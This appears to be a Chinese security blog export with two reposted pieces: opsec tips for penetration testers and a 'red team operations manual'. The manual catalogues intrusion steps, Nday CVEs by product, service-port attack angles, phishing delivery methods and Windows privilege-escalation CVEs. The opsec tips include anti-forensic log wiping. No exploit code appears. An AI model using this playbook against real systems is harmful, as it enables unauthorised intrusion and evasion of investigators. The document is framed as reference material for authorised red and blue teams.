<h3 id="安全意识篇"><a href="#安全意识篇" class="headerlink" title="安全意识篇"></a>安全意识篇</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">渗透工作电脑浏览器不能保存任何个人信息，防止被抓取信息。</span><br><span class="line">不随意修改管理员密码、后台密码。</span><br><span class="line">大文件需要打包分割下载。</span><br><span class="line">不使用国内VPS（阿里云、腾讯云）做CobaltStrike远控服务器。</span><br><span class="line">渗透项目结束后，不要继续进行测试。</span><br><span class="line">开发代码中不要留个人id，生成木马的时候不要在个人电脑生成，会带上电脑路径、电脑名称。</span><br><span class="line">永远用虚拟机操作，不要用真实机操作</span><br><span class="line">虚拟机快照，不必装杀软，完成项目后恢复一次快照</span><br><span class="line">电脑语言，用日语，英语，繁体字，不要用中文（看项目需要，一般用不上。）</span><br><span class="line">设置路由器只允许1723等其它VPN端口才能出网，一但VPN断开将自动断网，不然在扫描过程VPN断开会暴露真实IP地址（看项目需要，一般用不上。）</span><br><span class="line">从目标拖回来的任何文件都不要在有网的机器打开，要在专用脱网机打开。</span><br><span class="line">渗透物理机脱网（用于存储文件，信息等），网络流量从虚拟机搭建的网关走usb网卡+匿名线路（看项目需要，一般用不上。）</span><br><span class="line">注册网站需要验证码，使用接码平台。</span><br><span class="line">高管邮箱、运维人员邮箱，发现有VPN帐号或者重要系统登录地址，访问需谨慎，特别是登录需要下载控件，”安全登录控件.exe”等等</span><br><span class="line">Github收集目标信息时，需要特别关注项目更新时间节点，如果较为新的话，访问需谨，有可能是引诱攻击者进入沙箱。</span><br></pre></td></tr></table></figure>

<h3 id="暂未分类"><a href="#暂未分类" class="headerlink" title="暂未分类"></a>暂未分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多养一些仿大厂的域名，平时指向谷歌或者8.8.8.8，用的时候解析到自己服务器，不用的时候立马修改。（如果临时去注册域名或者短期内想要使用域名，会浪费很多时间在这上面，甚至能被安全设备检测，这是常有的事情，需要平时多储备，提升域名的可信度。） ｜ID：protonarm-ossr</span><br><span class="line">记住自己上传的木马，保留好地址，项目结束后一定要删除或者提交，避免项目结束忘记清除被防守方发现，这锅很难说得清的。</span><br><span class="line">在授权项目中，使用爬虫的过程中会做一些误操作，导致对网站不可逆的影响（爬取链接时，特别是已登录的状态下，爬取到delete页面会导致数据被删除） | ID: cangqingzhe提供</span><br><span class="line">清理日志时需要以文件覆盖的方式删除文件，防止数据恢复，或者仅删除指定ID的日志. | ID：zhuotougg</span><br><span class="line">一个团队，一定要团结一心，相互包容，互相帮助学习和进步，不要勾心斗角。否则这团队个人再厉害也是一盘散沙。</span><br><span class="line">所有浏览器升级到最新版本，禁止使用旧版谷歌浏览器 ｜ ID: 得闲饮茶</span><br><span class="line">有反蜜罐插件anti-honeypot，工具都是不可信的，防守方把靶标伪装成蜜罐 | ID：mx7krshell</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/EvilAnne/Violation_Pnetest">https://github.com/EvilAnne/Violation_Pnetest</a></p>
]]></content>
      <categories>
        <category>转载</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>转载-红队作战手册</title>
    <url>/2021/11/05/%E8%BD%AC%E8%BD%BD-%E7%BA%A2%E9%98%9F%E4%BD%9C%E6%88%98%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>以下仅针对日常 “红队” 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总</p>
<span id="more"></span>

<h3 id="分享初衷"><a href="#分享初衷" class="headerlink" title="分享初衷"></a>分享初衷</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考</span><br><span class="line">还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽</span><br><span class="line"></span><br><span class="line">二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献</span><br><span class="line">个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事</span><br></pre></td></tr></table></figure>

<h3 id="丑话说在前面"><a href="#丑话说在前面" class="headerlink" title="丑话说在前面"></a>丑话说在前面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动</span><br><span class="line">严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....</span><br><span class="line">严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担</span><br></pre></td></tr></table></figure>

<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)</span><br><span class="line">由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的</span><br><span class="line">而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动</span><br><span class="line">这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战</span><br><span class="line">所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的</span><br><span class="line">需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用</span><br><span class="line">由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同</span><br><span class="line">所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善</span><br><span class="line">个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的</span><br><span class="line">稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态</span><br><span class="line">尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人</span><br><span class="line">所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的</span><br><span class="line">虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色</span><br><span class="line">说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本</span><br><span class="line">另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</span><br></pre></td></tr></table></figure>

<h3 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure>

<h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]"></a>0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绕CDN找出目标所有真实ip段</span><br><span class="line">找目标的各种Web管理后台登录口</span><br><span class="line">批量抓取目标所有真实C段 Web banner</span><br><span class="line">批量对目标所有真实C段 进行基础服务端口扫描探测识别</span><br><span class="line">尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破</span><br><span class="line">批量抓取目标所有子域 Web banner</span><br><span class="line">批量对目标所有子域集中进行基础服务端口探测识别</span><br><span class="line">批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本</span><br><span class="line">从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;</span><br><span class="line">从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码</span><br><span class="line">从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]</span><br><span class="line">目标Svn里泄露的各类 敏感文件</span><br><span class="line">网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]</span><br><span class="line">目标站点自身在前端代码中泄露的各种敏感信息</span><br><span class="line">fofa / shodan / bing / google  hacking 深度利用</span><br><span class="line">搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]</span><br><span class="line">目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息</span><br><span class="line">目标微信小程序</span><br><span class="line">分析目标app Web请求</span><br><span class="line">借助js探针搜集目标内网信息</span><br><span class="line">想办法混入目标的各种 内部QQ群 / 微信群</span><br><span class="line">分析目标直接供应商 [尤其是技术外包]</span><br><span class="line">根据前面已搜集到的各类信息制作有针对性的弱口令字典</span><br><span class="line">目标所用 Waf 种类识别 与 绕过</span><br><span class="line">BypassWAF 文件上传 / 读取 / 下载</span><br><span class="line">   BypassWAF Sql注入</span><br><span class="line">   BypassWAF RCE</span><br><span class="line">   BypassWAF 各类Java Web中间件已知Nday漏洞利用</span><br><span class="line">   BypassWAF Webshell 免杀</span><br><span class="line">	</span><br><span class="line">其它更多 , 待补充修正...</span><br></pre></td></tr></table></figure>

<h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用</span><br><span class="line">如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向</span><br><span class="line">故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;</span><br></pre></td></tr></table></figure>

<h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑</span><br><span class="line">所以拿到的shell权限一般也非常高,通常都直接是服务器权限</span><br><span class="line">尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限</span><br><span class="line">关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Struts2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2-005</span><br><span class="line">Struts2-008</span><br><span class="line">Struts2-009</span><br><span class="line">Struts2-013</span><br><span class="line">Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)</span><br><span class="line">Struts2-019</span><br><span class="line">Struts2-020</span><br><span class="line">Struts2-devmode</span><br><span class="line">Struts2-032</span><br><span class="line">Struts2-033</span><br><span class="line">Struts2-037</span><br><span class="line">Struts2-045</span><br><span class="line">Struts2-046</span><br><span class="line">Struts2-048</span><br><span class="line">Struts2-052</span><br><span class="line">Struts2-053</span><br><span class="line">Struts2-057</span><br></pre></td></tr></table></figure></li>
<li><p>weblogic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-2725</span><br><span class="line">CVE-2019-2729</span><br><span class="line">CVE-2018-3191</span><br><span class="line">CVE-2018-2628</span><br><span class="line">CVE-2018-2893</span><br><span class="line">CVE-2018-2894</span><br><span class="line">CVE-2017-3506</span><br><span class="line">CVE-2017-10271</span><br><span class="line">CVE-2017-3248</span><br><span class="line">CVE-2016-0638</span><br><span class="line">CVE-2016-3510</span><br><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2014-4210</span><br><span class="line"></span><br><span class="line">SSRF</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li>
<li><p>Jboss</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2015-7501</span><br><span class="line">CVE-2017-7504</span><br><span class="line">CVE-2017-12149</span><br><span class="line"></span><br><span class="line">未授权访问,部署webshell</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li>
<li><p>wildfly [ jboss 7.x 改名为 wildfly ]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li>
<li><p>Tomcat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2016-8735</span><br><span class="line">CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]</span><br><span class="line">CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]</span><br><span class="line"></span><br><span class="line">控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</span><br></pre></td></tr></table></figure></li>
<li><p>Jekins</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2018-1999002 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,任意命令执行</span><br><span class="line">控制台弱口令,任意命令执行</span><br></pre></td></tr></table></figure></li>
<li><p>ElasticSearch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2014-3120 [专门针对老版本(无沙盒)RCE]</span><br><span class="line">CVE-2015-1427 [Groovy RCE]</span><br><span class="line">CVE-2015-3337 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure></li>
<li><p>RabbitMQ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱口令</span><br></pre></td></tr></table></figure></li>
<li><p>Glassfish</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">任意文件读取 [ 低版本 ]</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li>
<li><p>IBM Websphere</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java 反序列化</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li>
<li><p>Axis2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">任意文件读取</span><br><span class="line">目录遍历</span><br></pre></td></tr></table></figure></li>
<li><p>Apache ActiveMQ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未授权访问,5.12 之前的版本 fileserver存在 PUT任意写</span><br><span class="line">CVE-2015-5254</span><br></pre></td></tr></table></figure></li>
<li><p>Apache Solr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2017-12629</span><br><span class="line">CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</span><br></pre></td></tr></table></figure></li>
<li><p>Apache Zookeeper</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure></li>
<li><p>Apache Shiro反序列化</p>
</li>
<li><p>fastjson &lt;= 1.2.47 反序列化利用</p>
<h4 id="针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口"><a href="#针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口" class="headerlink" title="针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]"></a>针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AppServ</span><br><span class="line">Xampp</span><br><span class="line">宝塔</span><br><span class="line">PhpStudy		</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="针对各类开源程序的-已知Nday漏洞利用"><a href="#针对各类开源程序的-已知Nday漏洞利用" class="headerlink" title="针对各类开源程序的 已知Nday漏洞利用"></a>针对各类开源程序的 已知Nday漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dedecms 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">thinkphp 5.x 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpcms 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">ecshop 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">Metinfo 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">discuz 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">帝国cms 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpmyadmin 	数据库弱口令,系列已知nday漏洞利用</span><br><span class="line">wordpress 	后台弱口令,系列已知nday漏洞利用</span><br><span class="line">joomla 		后台弱口令,系列已知nday漏洞利用</span><br><span class="line">drupal 		CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h4 id="针对其它各类Web组件的-已知Nday漏洞利用"><a href="#针对其它各类Web组件的-已知Nday漏洞利用" class="headerlink" title="针对其它各类Web组件的 已知Nday漏洞利用"></a>针对其它各类Web组件的 已知Nday漏洞利用</h4><ul>
<li><p>IIS 6.0 RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">短文件漏洞</span><br><span class="line">PUT 任意写</span><br><span class="line">Webdav RCE CVE-2017-7269</span><br></pre></td></tr></table></figure></li>
<li><p>禅道项目管理系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">文件读取</span><br><span class="line">远程执行</span><br></pre></td></tr></table></figure></li>
<li><p>通达OA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">任意上传</span><br></pre></td></tr></table></figure></li>
<li><p>Exchange</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用接口进行邮箱用户名枚举</span><br><span class="line">针对各个接口的弱口令爆破</span><br><span class="line">CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li>
<li><p>Zimbra [ XXE + SSRF =&gt; RCE ]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2013-7091</span><br><span class="line">CVE-2016-9924</span><br><span class="line">CVE-2019-9670</span><br></pre></td></tr></table></figure></li>
<li><p>Citrix</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-19781</span><br></pre></td></tr></table></figure></li>
<li><p>Jumpserver</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">身份验证绕过</span><br></pre></td></tr></table></figure></li>
<li><p>Zabbix</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2017-2824</span><br><span class="line">SQL注入 [ 2.0 老版本 ]</span><br><span class="line">控制台弱口令,敏感机器信息泄露</span><br></pre></td></tr></table></figure></li>
<li><p>Cacti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低版本 SQL注入</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure></li>
<li><p>Nagios</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2016-9565</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure></li>
<li><p>Webmin RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-15107 </span><br></pre></td></tr></table></figure></li>
<li><p>PHPMailer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2016-10033</span><br></pre></td></tr></table></figure></li>
<li><p>泛微OA远程代码执行</p>
</li>
<li><p>金蝶OA SQL注入</p>
</li>
<li><p>Coremail 敏感文件泄露</p>
</li>
<li><p>UEditor 任意文件上传</p>
</li>
<li><p>OpenSSL心脏滴血抓明文账号密码  [ Heartbleed ]</p>
</li>
<li><p>破壳漏洞 [ Shellshock ] </p>
<h4 id="各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的"><a href="#各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的" class="headerlink" title="各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]"></a>各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">SSRF</span><br><span class="line">sql注入</span><br><span class="line">越权</span><br><span class="line">命令 / 代码执行 / 反序列化</span><br><span class="line">任意文件上传 / 下载 / 读取</span><br><span class="line">包含</span><br><span class="line">XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)</span><br><span class="line">业务逻辑漏洞</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用"><a href="#针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用" class="headerlink" title="针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用"></a>针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用</h4><ul>
<li>Pulse Secure VPN<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-11510 [ 任意文件读取 ]</span><br></pre></td></tr></table></figure></li>
<li>Fortinet VPN<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2018-13379 [ 文件读取 ]</span><br></pre></td></tr></table></figure></li>
<li>Sangfor Vpn RCE</li>
</ul>
<h3 id="0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”"><a href="#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”" class="headerlink" title="0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]"></a>0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 </span><br><span class="line">同样,已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序</span><br><span class="line">如下,就每个端口的具体攻击利用方式,进行了简要说明</span><br></pre></td></tr></table></figure>

<ul>
<li>Top Port List<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mssql 	  [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WinRM	  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]</span><br><span class="line">SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]</span><br><span class="line">REDIS	  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]</span><br><span class="line">POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]</span><br><span class="line">SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]</span><br><span class="line">POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]</span><br><span class="line">VNC       [ 默认工作在tcp 5900端口, 弱口令 ]</span><br><span class="line">FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]</span><br><span class="line">Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]</span><br><span class="line">TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]</span><br><span class="line">SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]</span><br><span class="line">CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="0x04-入口权限获取"><a href="#0x04-入口权限获取" class="headerlink" title="0x04 入口权限获取"></a>0x04 入口权限获取</h3><h4 id="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"><a href="#传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点" class="headerlink" title="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"></a>传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</h4><ul>
<li><p>发信前期准备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">枚举有效的目标邮箱用户名列表</span><br><span class="line">批量探测目标邮箱弱口令</span><br><span class="line">伪造发信人 [ 发信邮服搭建 ]</span><br><span class="line">钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
<li><p>典型投递方式 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种,直接给目标发送各种常规木马信 </span><br><span class="line"></span><br><span class="line">传统宏利用</span><br><span class="line">捆绑</span><br><span class="line">exe[zip,7z]</span><br><span class="line">lnk</span><br><span class="line">chm</span><br><span class="line">自解压</span><br><span class="line">木马链接</span><br><span class="line">OLE</span><br><span class="line">CVE-2017-11882 [ 利用漏洞触发 ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 </span><br><span class="line"></span><br><span class="line">Vpn</span><br><span class="line">Mail</span><br><span class="line">OA</span><br><span class="line">Net ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>


<h3 id="0x05-主机安全-提权利用，防御重点"><a href="#0x05-主机安全-提权利用，防御重点" class="headerlink" title="0x05 主机安全 [ 提权利用，防御重点 ]"></a>0x05 主机安全 [ 提权利用，防御重点 ]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&quot;边缘性&quot;的利用都暂未提及</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BypassUAC [ win7 / 8  / 8.1 / 10 ]</span><br><span class="line">MS14-058[KB3000061]				    [重点]</span><br><span class="line">MS14-068[KB3011780]				    [重点]</span><br><span class="line">ms15-051[KB3045171]				    [重点]</span><br><span class="line">MS15-077[KB3077657]				    [重点]</span><br><span class="line">MS16-032[KB3124280]				    [重点]</span><br><span class="line">ms16-075					    [重点]</span><br><span class="line">MS16-135[KB3199135]				    [重点]</span><br><span class="line">MS17-010[KB4013389]				    [重点]</span><br><span class="line">cve-2019-0708					    [重点]</span><br><span class="line">CVE-2019-0803					    [重点]</span><br><span class="line">CVE-2019-1322 &amp; CVE-2019-1405			    [重点]</span><br><span class="line">cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]	    [重点]		</span><br></pre></td></tr></table></figure></li>
